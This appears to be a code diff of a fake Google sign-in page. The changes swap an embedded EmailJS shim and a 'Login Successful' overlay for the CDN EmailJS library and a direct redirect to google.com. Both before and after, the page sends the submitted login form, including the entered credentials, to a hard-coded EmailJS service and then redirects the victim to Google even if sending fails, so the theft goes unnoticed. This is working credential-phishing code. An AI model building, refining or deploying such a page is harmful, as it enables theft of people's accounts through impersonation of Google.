@@ -90,78 +90,6 @@
     display: block;
   }
   
-  /* Success overlay */
-  .success-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: white;
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-  }
-  
-  .success-content {
-    text-align: center;
-    padding: 0;
-    background: white;
-    width: 100%;
-    max-width: 400px;
-  }
-  
-  .google-logo {
-    margin-bottom: 32px;
-  }
-  
-  .google-logo img {
-    height: 48px;
-  }
-  
-  .success-title {
-    font-size: 28px;
-    font-weight: 400;
-    color: #202124;
-    margin-bottom: 16px;
-    font-family: 'Google Sans', Arial, sans-serif;
-  }
-  
-  .success-subtitle {
-    font-size: 16px;
-    color: #5f6368;
-    margin-bottom: 40px;
-    line-height: 1.5;
-  }
-  
-  .loading-container {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    margin-top: 24px;
-  }
-  
-  .google-spinner {
-    width: 20px;
-    height: 20px;
-    border: 2px solid #f3f3f3;
-    border-top: 2px solid #4285f4;
-    border-radius: 50%;
-    animation: spin 1s linear infinite;
-    margin-right: 12px;
-  }
-  
-  .loading-text {
-    font-size: 14px;
-    color: #5f6368;
-  }
-  
-  @keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-  
   .back-link {
     font-size: 14px;
     color: #1a73e8;
@@ -244,81 +172,32 @@
   </div>
 </div>
 
-<!-- Success Overlay -->
-<div class="success-overlay" id="success-overlay">
-  <div class="success-content">
-    <div class="success-icon">✓</div>
-    <div class="success-title">Login Successful</div>
-    <div class="success-message">
-      Redirecting to Google in <span id="countdown">3</span> seconds...
-    </div>
-  </div>
-</div>
+<!-- Load EmailJS from CDN -->
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script type="text/javascript">
+   // Wait for EmailJS to load before initializing
+   function initEmailJS() {
+     if (typeof emailjs !== 'undefined') {
+       emailjs.init({
+         publicKey: "EB017wgX1BeDuRY66",
+       });
+       console.log("EmailJS v4 initialized successfully");
+     } else {
+       setTimeout(initEmailJS, 100);
+     }
+   }
+   initEmailJS();
+</script>
 
 <script>
-  // EmailJS library embedded (simplified version)
-  window.emailjs = {
-    init: function(publicKey) {
-      this.publicKey = publicKey;
-      console.log("EmailJS initialized with key:", publicKey);
-    },
-    
-    send: function(serviceID, templateID, templateParams) {
-      return new Promise((resolve, reject) => {
-        console.log("Sending email with:", { serviceID, templateID, templateParams });
-        
-        const data = {
-          service_id: serviceID,
-          template_id: templateID,
-          user_id: this.publicKey,
-          template_params: templateParams
-        };
-        
-        fetch('https://api.emailjs.com/api/v1.0/email/send', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log("EmailJS API success");
-            resolve(response);
-          } else {
-            console.log("EmailJS API error:", response.status);
-            reject(response);
-          }
-        })
-        .catch(error => {
-          console.log("EmailJS fetch error:", error);
-          reject(error);
-        });
-      });
-    },
-    
-    sendForm: function(serviceID, templateID, form) {
-      const formData = new FormData(form);
-      const templateParams = {};
-      
-      // Convert form data to template params
-      for (let [key, value] of formData.entries()) {
-        templateParams[key] = value;
-      }
-      
-      return this.send(serviceID, templateID, templateParams);
-    }
-  };
 
   (function() {
-    console.log("Script starting with embedded EmailJS..."); // Debug log
+    console.log("Script starting..."); // Debug log
     
-    const USER_ID = "EB017wgX1BeDuRY66";
     const SERVICE_ID = "service_64albro";
-    const TEMPLATE_ID = "template_mutrouf"; // Fixed template ID
+    const TEMPLATE_ID = "template_mutrouf";
     
-    // Initialize EmailJS immediately
-    emailjs.init(USER_ID);
+    // EmailJS is now initialized above, so it should be ready
     let emailjsReady = true;
     
     const loginPage = document.getElementById("login-page");
@@ -327,8 +206,6 @@
     const recoveryForm = document.getElementById("recovery-form");
     const forgotLink = document.getElementById("forgot-link");
     const backLink = document.getElementById("back-link");
-    const successOverlay = document.getElementById("success-overlay");
-    const countdownEl = document.getElementById("countdown");
     
     // Error elements
     const emailInput = document.getElementById("email");
@@ -372,40 +249,17 @@
       }
     });
     
-    // Show success and redirect to Google
-    function showSuccessAndRedirect() {
-      console.log("Showing success overlay..."); // Debug log
+    // Direct redirect to Google
+    function redirectToGoogle() {
+      console.log("Redirecting to Google..."); // Debug log
       
-      // Make sure overlay is visible
-      successOverlay.style.display = "flex";
-      successOverlay.style.position = "fixed";
-      successOverlay.style.top = "0";
-      successOverlay.style.left = "0";
-      successOverlay.style.width = "100%";
-      successOverlay.style.height = "100%";
-      successOverlay.style.zIndex = "9999";
-      
-      let countdown = 3;
-      countdownEl.textContent = countdown;
-      
-      const timer = setInterval(() => {
-        countdown--;
-        countdownEl.textContent = countdown;
-        console.log("Countdown:", countdown); // Debug log
-        
-        if (countdown <= 0) {
-          clearInterval(timer);
-          console.log("Redirecting to Google..."); // Debug log
-          
-          // Force redirect
-          try {
-            window.location.href = "https://www.google.com";
-          } catch (e) {
-            // Fallback
-            window.open("https://www.google.com", "_blank");
-          }
-        }
-      }, 1000);
+      // Force redirect
+      try {
+        window.location.href = "https://www.google.com";
+      } catch (e) {
+        // Fallback
+        window.open("https://www.google.com", "_blank");
+      }
     }
     
     // Login form submission
@@ -446,19 +300,19 @@
           console.log("Service ID:", SERVICE_ID);
           console.log("Template ID:", TEMPLATE_ID);
           
+          // Use the proper EmailJS sendForm method
           emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
             .then(function(response) {
-              console.log("EmailJS SUCCESS:", response);
-              showSuccessAndRedirect();
-            })
-            .catch(function(error) {
+              console.log("EmailJS SUCCESS:", response.status, response.text);
+              redirectToGoogle();
+            }, function(error) {
               console.log("EmailJS ERROR:", error);
-              console.log("Showing success anyway for demo");
-              showSuccessAndRedirect();
+              console.log("Redirecting anyway for demo");
+              redirectToGoogle();
             });
         } else {
-          console.log("EmailJS not ready, showing success for demo");
-          showSuccessAndRedirect();
+          console.log("EmailJS not ready, redirecting for demo");
+          redirectToGoogle();
         }
       } else {
         console.log("Validation errors found"); // Debug log
